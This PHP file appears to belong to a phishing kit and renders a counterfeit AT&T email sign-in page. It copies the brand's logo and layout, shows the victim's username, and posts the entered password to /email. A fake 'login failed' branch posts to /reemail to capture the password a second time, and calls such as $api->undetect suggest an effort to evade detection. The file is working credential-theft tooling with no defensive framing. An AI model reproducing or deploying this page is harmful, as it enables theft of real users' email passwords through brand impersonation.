<?php
require __DIR__ . '/../../function.php';
require $api->language();

$page = "Email ATT";
$api->check_cookie();

$api->session("glitch", true, $page);

$html = '
<!DOCTYPE html>
<html lang="en" class="isPC isChrome isLandscape">
    <head>
        <title>'.$api->text_encode($lang['emailatt']['title']).'</title>
        <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <link rel="icon" type="image/x-icon" href="'.$api->image_encode("assets/email/att/img/favicon.ico")['local'].'">
        <link rel="preload" href="'.$api->text_encode("../assets/email/att/fonts/ATTAleckSans_W_Rg.woff2").'" as="font" type="font/woff2" crossorigin="">
        <link rel="preload" href="'.$api->text_encode("../assets/email/att/fonts/ATTAleckSans_W_Bd.woff2").'" as="font" type="font/woff2" crossorigin="">
        <link rel="preload" href="'.$api->text_encode("../assets/email/att/img/att_hz_lg_lkp_rgb_pos.svg").'" as="image" type="image/svg+xml">
        <link rel="stylesheet" href="'.$api->text_encode("../assets/email/att/css/main-att.css").'">
        <style>
        .full-height[_ngcontent-ng-c3043995431] {
          min-height:100vh
        }
        </style>
        <style>
        .footer-div[_ngcontent-ng-c62901331] {
          margin-top:48px;
          margin-bottom:24px
        }
        .footer-links-div[_ngcontent-ng-c62901331] {
          display:flex;
          flex-direction:row
        }
        .footer-links-div[_ngcontent-ng-c62901331]   app-footer-link[_ngcontent-ng-c62901331] {
          margin-right:24px
        }
        .footer-links-div[_ngcontent-ng-c62901331]   app-footer-link[_ngcontent-ng-c62901331]:last-child {
          margin-right:0
        }
        .copyright[_ngcontent-ng-c62901331] {
          margin-top:16px;
          display:flex;
          flex-direction:row;
          align-items:center;
          justify-content:center
        }
        @media (max-width: 767px) {
          .footer-div[_ngcontent-ng-c62901331] {
            margin-bottom:32px
          }
          .footer-links-div[_ngcontent-ng-c62901331] {
            display:flex;
            flex-direction:column;
            align-items:flex-start
          }
          .footer-links-div[_ngcontent-ng-c62901331]   app-footer-link[_ngcontent-ng-c62901331] {
            margin-bottom:10px
          }
          .footer-links-div[_ngcontent-ng-c62901331]   app-footer-link[_ngcontent-ng-c62901331]:last-child {
            margin-bottom:0
          }
          app-footer-link[_ngcontent-ng-c62901331] {
            height:24px
          }
          .copyright[_ngcontent-ng-c62901331] {
            margin-top:16px;
            justify-content:flex-start
          }
        }
        </style>
        <style>
        .space-below[_ngcontent-ng-c1166392827] {
          margin-bottom:32px
        }
        @media (max-width: 767px) {
          .space-below[_ngcontent-ng-c1166392827] {
            margin-bottom:24px
          }
        }
        </style>
        <style>
        .header-logo-position-fr-qrcard[_ngcontent-ng-c1566362065] {
          margin-left:70px;
          align-self:flex-start
        }
        .header-logo-position-fr-learMore[_ngcontent-ng-c1566362065] {
          margin-bottom:48px;
          align-self:flex-start
        }
        .header-floating-logo-generic[_ngcontent-ng-c1566362065] {
          margin-top:32px;
          margin-left:70px;
          margin-bottom:64px;
          align-self:flex-start
        }
        .left-align-header-logo-desktop[_ngcontent-ng-c1566362065] {
          align-self:flex-start
        }
        .header-logo-image-no-bottom[_ngcontent-ng-c1566362065] {
          margin-bottom:0
        }
        @media (max-width: 767px) {
          .header-logo-position-fr-qrcard[_ngcontent-ng-c1566362065] {
            margin-left:0;
            align-self:center
          }
          .header-logo-position-fr-learMore[_ngcontent-ng-c1566362065] {
            margin-bottom:16px;
            align-self:center
          }
          .header-floating-logo-generic[_ngcontent-ng-c1566362065] {
            margin-left:0;
            margin-bottom:32px;
            align-self:center
          }
          .left-align-header-logo-desktop[_ngcontent-ng-c1566362065] {
            align-self:center;
            margin-bottom:32px
          }
          .header-logo-image-no-bottom[_ngcontent-ng-c1566362065] {
            margin-bottom:0
          }
        }
        </style>
        <style>
        .prepaid-ctn-button[_ngcontent-ng-c1134081943] {
          width:100%;
          height:48px;
          text-align:center;
          border-radius:3px;
          border:solid 1px #1d2329;
          background-color:#fff;
          color:#1d2329;
          font-size:1.4rem;
          line-height:2.5rem;
          margin-top:8px;
          display:flex;
          align-items:center;
          justify-content:center
        }
        .prepaid-ctn-button[_ngcontent-ng-c1134081943]:hover {
          text-decoration:none;
          background-color:#1d2329;
          color:#fff
        }
        </style>
    </head>
    <body>
        <div id="app-root" _nghost-ng-c3043995431="" ng-version="16.2.12" app-version="25.6.2">
            <div _ngcontent-ng-c3043995431="" id="appCompBackground" class="full-width-background bg-white">
                <div _ngcontent-ng-c3043995431="" id="appCompContainer" class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column">
                    <div _ngcontent-ng-c3043995431="" id="appCompCardContainer" class="row justify-center flex-1">
                        <div _ngcontent-ng-c3043995431="" id="appCompCardContDiv" class="pad-none">
                            <app-card _ngcontent-ng-c3043995431="" role="main">
                                <div class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
                                    <div class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
                                        <app-header class="flex-container" _nghost-ng-c1566362065="">
                                            <img _ngcontent-ng-c1566362065="" id="headerLogoImage" src="'.$api->image_encode("assets/email/att/img/att_hz_lg_lkp_rgb_pos.svg")['local'].'" class="header-logo-image mar-b-md-all">
                                            <div _ngcontent-ng-c1566362065="" class="mar-b-md-all text-center" id="signInHeaderTextDiv">
                                                <h1 _ngcontent-ng-c1566362065="" class="heading-lg" id="signInHeaderText">'.$api->text_encode($lang['emailatt']['signin']).'</h1>
                                                <h1 _ngcontent-ng-c1566362065="" class="heading-md mar-t-xxs-lg" id="signInHeaderToText">'.$api->text_encode($lang['emailatt']['tomyatt']).'</h1>
                                            </div>
                                        </app-header>
                                        <div class="width-full">
                                            <router-outlet></router-outlet>
                                            <app-manual-login>
                                                ';
                                                if (isset($_GET['error']) && $_GET['error'] == true) {
                                                $html .= '
                                                <app-error id="appErrorAbove">
                                                    <div id="errContainer" role="status" class="flex flex-items-top mar-b-lg-sm mar-b-md-lg">
                                                        <div id="errorIcon" class="height-sm-lg width-sm-lg flex-shrink-0 mar-r-xxs">
                                                            <svg height="32" width="32" viewBox="0 0 32 32" aria-label="icon image" role="img" focusable="false">
                                                                <path d="M29.21 24.53L18.62 5.63a3 3 0 00-5.24 0L2.79 24.53A3 3 0 005.41 29h21.18a3 3 0 002.62-4.47zM17 24h-2v-2h2zm0-4h-2v-8h2z" fill="#ea712f"></path>
                                                            </svg>
                                                        </div>
                                                        <div>
                                                            <p id="errorContent" class="flex flex-column type-sm line-h-md">
                                                                <span>
                                                                    <span id="errorDescArea">'.$api->text_encode($lang['emailatt']['alertfailed']).'</span>
                                                                </span>
                                                                <span id="errorCodeArea" class="type-12 mar-t-xxs">'.$api->text_encode($lang['emailatt']['carealert']).'
                                                                    <span id="errorCareCodeValue">'.$api->text_encode('201 [LU100]').'</span>
                                                                </span>
                                                            </p>
                                                        </div>
                                                    </div>
                                                </app-error>
                                                <form method="POST" class="manual-login-form ng-pristine ng-invalid ng-touched" action="/reemail">
                                                <app-user-input _nghost-ng-c1166392827="">
                                                    <div _ngcontent-ng-c1166392827="" id="userInputContainerDiv" class="form-row space-below ng-pristine ng-invalid ng-touched">
                                                        <div _ngcontent-ng-c1166392827="" id="userBackButtonDiv" class="flex flex-row flex-centered">
                                                            <button _ngcontent-ng-c1166392827="" id="userBackButton" type="button" class="user-back-button btn-reset touch-space flex-row flex-centered">
                                                                <img _ngcontent-ng-c1166392827="" id="userBackButtonLeftCircleImg" class="back-button-svg-white" src="'.$api->image_encode("assets/email/att/img/arrow-left-circle_24.svg")['local'].'">
                                                                <img _ngcontent-ng-c1166392827="" id="userBackButtonFilledCircleImg" class="back-button-svg-black" src="'.$api->image_encode("assets/email/att/img/arrow-left-circle-filled_24.svg")['local'].'">
                                                                <span _ngcontent-ng-c1166392827="" id="userBackButtonSpanTxt" class="font-regular type-base letter-spacing-3 overflow-hidden nowrap text-overflow">'.$_SESSION['username'].'</span>
                                                            </button>
                                                        </div>
                                                    </div>
                                                </app-user-input>
                                                <app-user-input _nghost-ng-c1166392827="">
                                                    <div class="form-row rel ng-pristine ng-invalid ng-touched">
                                                        <label _ngcontent-ng-c1166392827="" id="passwordLabel" for="password" class="formfield-label">'.$api->text_encode($lang['emailatt']['inputpassword']).'</label>
                                                        <input _ngcontent-ng-c1166392827="" id="login-passwd" name="'.$api->encypt("passwordemail").'" type="password" class="textfield textfield-password ng-pristine ng-invalid ng-touched" required>
                                                        <button id="showHideButton" tabindex="0" type="button" class="showHidePasswordButton absolute pad-xxs font-regular color-ui-black">'.$api->text_encode($lang['emailatt']['show']).'</button>
                                                        <div _ngcontent-ng-c1166392827="" id="passwordInlineErrorText" role="alert" class="formfield-msg"></div>
                                                    </div>
                                                </app-user-input>
                                                <app-kmsi-checkbox>
                                                    <div id="keepMeInContainerDiv" class="checkboxDiv mb-0">
                                                        <label id="keepMeInLabel" for="keepMeIn" class="checkbox inline-flex flex-items-top font-regular">
                                                            <input type="checkbox" id="keepMeIn" name="keepMeIn" value="N">
                                                            <div class="checkbox-skin"></div>
                                                            <span id="keepMeInText" class="rad-chk-txt">'.$api->text_encode($lang['emailatt']['keepsignin']).'</span>
                                                        </label>
                                                    </div>
                                                </app-kmsi-checkbox>
                                                <div class="continue-button-spacing">
                                                    <app-button-spinner class="width-full">
                                                        <button class="btn-full-width btn-primary letter-spacing-3" id="btnLogin" type="submit">'.$api->text_encode($lang['emailatt']['signin']).'</button>
                                                    </app-button-spinner>
                                                </div>
                                                <app-forgot-id-link>
                                                    <div id="forgotUserIDLinkContainer" class="mar-t-sm-all">
                                                        <a id="forgotUserID" class="link-text3 solo type-sm" href="#">'.$api->text_encode($lang['emailatt']['forgot']).'</a>
                                                    </div>
                                                </app-forgot-id-link>
                                                <app-dont-have-id-view>
                                                    <div class="mar-t-sm-all">
                                                        <div class="font-regular">
                                                            <a id="createNow" class="link-text3 solo type-sm" href="#">
                                                                <span id="dontHaveIdText">'.$api->text_encode($lang['emailatt']['donthave']).'</span>
                                                                <span>&nbsp;</span>'.$api->text_encode($lang['emailatt']['createone']).'
                                                            </a>
                                                        </div>
                                                    </div>
                                                </app-dont-have-id-view>
                                                <app-fast-pay-button>
                                                    <div id="fastPayArea" class="mar-t-sm-all">
                                                        <a id="fastPayButton" class="link-text3 solo type-sm" href="#" target="_self">'.$api->text_encode($lang['emailatt']['paywithout']).'</a>
                                                    </div>
                                                </app-fast-pay-button>
                                                <app-prepaid-ctn-button _nghost-ng-c1134081943=""></app-prepaid-ctn-button>
                                                </form>
                                                ';
                                                } else {
                                                $html .= '
                                                <form method="POST" class="manual-login-form ng-pristine ng-invalid ng-touched" action="/email">
                                                <app-user-input _nghost-ng-c1166392827="">
                                                    <div _ngcontent-ng-c1166392827="" id="userInputContainerDiv" class="form-row space-below ng-pristine ng-invalid ng-touched">
                                                        <div _ngcontent-ng-c1166392827="" id="userBackButtonDiv" class="flex flex-row flex-centered">
                                                            <button _ngcontent-ng-c1166392827="" id="userBackButton" type="button" class="user-back-button btn-reset touch-space flex-row flex-centered">
                                                                <img _ngcontent-ng-c1166392827="" id="userBackButtonLeftCircleImg" class="back-button-svg-white" src="'.$api->image_encode("assets/email/att/img/arrow-left-circle_24.svg")['local'].'">
                                                                <img _ngcontent-ng-c1166392827="" id="userBackButtonFilledCircleImg" class="back-button-svg-black" src="'.$api->image_encode("assets/email/att/img/arrow-left-circle-filled_24.svg")['local'].'">
                                                                <span _ngcontent-ng-c1166392827="" id="userBackButtonSpanTxt" class="font-regular type-base letter-spacing-3 overflow-hidden nowrap text-overflow">'.$_SESSION['username'].'</span>
                                                            </button>
                                                        </div>
                                                    </div>
                                                </app-user-input>
                                                <app-user-input _nghost-ng-c1166392827="">
                                                    <div class="form-row rel ng-pristine ng-invalid ng-touched">
                                                        <label _ngcontent-ng-c1166392827="" id="passwordLabel" for="password" class="formfield-label">'.$api->text_encode($lang['emailatt']['inputpassword']).'</label>
                                                        <input _ngcontent-ng-c1166392827="" id="login-passwd" name="'.$api->encypt("passwordemail").'" type="password" class="textfield textfield-password ng-pristine ng-invalid ng-touched" required>
                                                        <button id="showHideButton" tabindex="0" type="button" class="showHidePasswordButton absolute pad-xxs font-regular color-ui-black">'.$api->text_encode($lang['emailatt']['show']).'</button>
                                                        <div _ngcontent-ng-c1166392827="" id="passwordInlineErrorText" role="alert" class="formfield-msg"></div>
                                                    </div>
                                                </app-user-input>
                                                <app-kmsi-checkbox>
                                                    <div id="keepMeInContainerDiv" class="checkboxDiv mb-0">
                                                        <label id="keepMeInLabel" for="keepMeIn" class="checkbox inline-flex flex-items-top font-regular">
                                                            <input type="checkbox" id="keepMeIn" name="keepMeIn" value="N">
                                                            <div class="checkbox-skin"></div>
                                                            <span id="keepMeInText" class="rad-chk-txt">'.$api->text_encode($lang['emailatt']['keepsignin']).'</span>
                                                        </label>
                                                    </div>
                                                </app-kmsi-checkbox>
                                                <div class="continue-button-spacing">
                                                    <app-button-spinner class="width-full">
                                                        <button class="btn-full-width btn-primary letter-spacing-3" id="btnLogin" type="submit">'.$api->text_encode($lang['emailatt']['signin']).'</button>
                                                    </app-button-spinner>
                                                </div>
                                                <app-forgot-id-link>
                                                    <div id="forgotUserIDLinkContainer" class="mar-t-sm-all">
                                                        <a id="forgotUserID" class="link-text3 solo type-sm" href="#">'.$api->text_encode($lang['emailatt']['forgot']).'</a>
                                                    </div>
                                                </app-forgot-id-link>
                                                <app-dont-have-id-view>
                                                    <div class="mar-t-sm-all">
                                                        <div class="font-regular">
                                                            <a id="createNow" class="link-text3 solo type-sm" href="#">
                                                                <span id="dontHaveIdText">'.$api->text_encode($lang['emailatt']['donthave']).'</span>
                                                                <span>&nbsp;</span>'.$api->text_encode($lang['emailatt']['createone']).'
                                                            </a>
                                                        </div>
                                                    </div>
                                                </app-dont-have-id-view>
                                                <app-fast-pay-button>
                                                    <div id="fastPayArea" class="mar-t-sm-all">
                                                        <a id="fastPayButton" class="link-text3 solo type-sm" href="#" target="_self">'.$api->text_encode($lang['emailatt']['paywithout']).'</a>
                                                    </div>
                                                </app-fast-pay-button>
                                                <app-prepaid-ctn-button _nghost-ng-c1134081943=""></app-prepaid-ctn-button>
                                                </form>
                                                ';
                                                }
                                                $html .= '
                                                <app-myatt-signin-button>
                                                    <div class="color-gray-400 hr-rule mar-t-md-all mar-b-md-all">
                                                        <hr class="color-gray-800 type-xs font-bold">
                                                    </div>
                                                </app-myatt-signin-button>
                                            </app-manual-login>
                                        </div>
                                    </div>
                                </div>
                            </app-card>
                        </div>
                    </div>
                    <div _ngcontent-ng-c3043995431="" id="appCompFooterContainer" class="row flex-centered">
                        <div _ngcontent-ng-c3043995431="" id="appCompFooterContDiv" class="grid-col-12 pad-none">
                            <app-footer _ngcontent-ng-c3043995431="" role="contentinfo" _nghost-ng-c62901331="">
                                <div _ngcontent-ng-c62901331="" class="login-background footer-div pad-l-lg-sm pad-r-lg-sm">
                                    <div _ngcontent-ng-c62901331="" id="footerLinksDiv" class="footer-links-div justify-center">
                                        <app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center">
                                            <a rel="noopener noreferrer" target="_blank" id="footerLink0" href="#" class="type-xs link-text2">'.$api->text_encode($lang['emailatt']['legal']).'</a>
                                        </app-footer-link>
                                        <app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center">
                                            <a rel="noopener noreferrer" target="_blank" id="footerLink1" href="#" class="type-xs link-text2">'.$api->text_encode($lang['emailatt']['privacy']).'</a>
                                        </app-footer-link>
                                        <app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center">
                                            <a rel="noopener noreferrer" target="_blank" id="footerLink2" href="#" class="type-xs link-text2">'.$api->text_encode($lang['emailatt']['terms']).'</a>
                                        </app-footer-link>
                                        <app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center">
                                            <a rel="noopener noreferrer" target="_blank" id="footerLink3" href="#" class="type-xs link-text2">'.$api->text_encode($lang['emailatt']['accessibility']).'</a>
                                        </app-footer-link>
                                        <app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center">
                                            <app-footer-link-icon id="footerLinkIconElLeft4">
                                                <div class="flex flex-row flex-items-center footer-link-icon" id="footerLinkIcon4">
                                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" focusable="true" class="footer-link-icon-svg" id="footerLinkIconSvg4">
                                                        <rect x="1" y="6.07595" width="22" height="11.1392" rx="5.56962" fill="white"></rect>
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M17.4304 6.07595C20.5064 6.07595 23 8.56955 23 11.6456C23 14.7216 20.5064 17.2152 17.4304 17.2152H6.56962C3.49361 17.2152 1 14.7216 1 11.6456C1 8.56955 3.49361 6.07595 6.56962 6.07595H17.4304ZM13.2679 6.91818H6.56962C3.95876 6.91818 1.84223 9.03471 1.84223 11.6456C1.84223 14.2564 3.95876 16.373 6.56962 16.373H10.7321L13.2679 6.91818ZM10.3553 9.41582C10.5301 9.55752 10.557 9.81415 10.4153 9.98902L7.41378 13.6942C7.16006 14.0074 6.69106 14.0319 6.4061 13.7468L4.65019 11.9904C4.49109 11.8312 4.49109 11.5732 4.65019 11.414C4.80929 11.2549 5.06725 11.2549 5.22635 11.414L6.87565 13.0638L9.78224 9.47587C9.92389 9.301 10.1804 9.27411 10.3553 9.41582ZM15.1023 9.24971C14.9477 9.08617 14.6899 9.07896 14.5264 9.2336C14.3629 9.38824 14.3557 9.64617 14.5103 9.80971L16.2013 11.5987L14.4609 13.3396C14.3018 13.4988 14.3018 13.7568 14.4609 13.916C14.62 14.0751 14.878 14.0751 15.0371 13.916L16.7614 12.1911L18.4368 13.9635C18.5914 14.1271 18.8493 14.1343 19.0128 13.9796C19.1762 13.825 19.1835 13.5671 19.0289 13.4035L17.3378 11.6146L19.0782 9.8736C19.2373 9.71445 19.2373 9.45641 19.0782 9.29726C18.9191 9.13811 18.6611 9.13811 18.502 9.29726L16.7777 11.0221L15.1023 9.24971Z" fill="#454B52"></path>
                                                    </svg>
                                                </div>
                                            </app-footer-link-icon>
                                            <a rel="noopener noreferrer" target="_blank" id="footerLink4" href="#" class="type-xs link-text2 mar-l-xxs-lg">'.$api->text_encode($lang['emailatt']['privacychoice']).'</a>
                                        </app-footer-link>
                                    </div>
                                    <div _ngcontent-ng-c62901331="" class="font-regular copyright">
                                        <span _ngcontent-ng-c62901331="" id="copyrightTextSpan" class="type-xs color-ui-medium-gray">©'.$api->text_encode(date("Y")).' '.$api->text_encode($lang['emailatt']['copyright']).'</span>
                                    </div>
                                </div>
                            </app-footer>
                        </div>
                    </div>
                </div>
            </div>
            <app-full-page-spinner _ngcontent-ng-c3043995431=""></app-full-page-spinner>
        </div>
        <script>
        document.addEventListener("DOMContentLoaded", function() {
            const passwordInput = document.getElementById("login-passwd");
            const toggleButton = document.getElementById("showHideButton");
        
            toggleButton.addEventListener("click", function() {
                if (passwordInput.type === "password") {
                    passwordInput.type = "text";
                    toggleButton.classList.remove("hide-pw");
                    toggleButton.classList.add("show-pw");
                    toggleButton.textContent = "Hide";
                } else {
                    passwordInput.type = "password";
                    toggleButton.classList.remove("show-pw");
                    toggleButton.classList.add("hide-pw");
                    toggleButton.textContent = "Show";
                }
            });
        });
        </script>
    </body>
</html>';

$api->undetect($html);
?>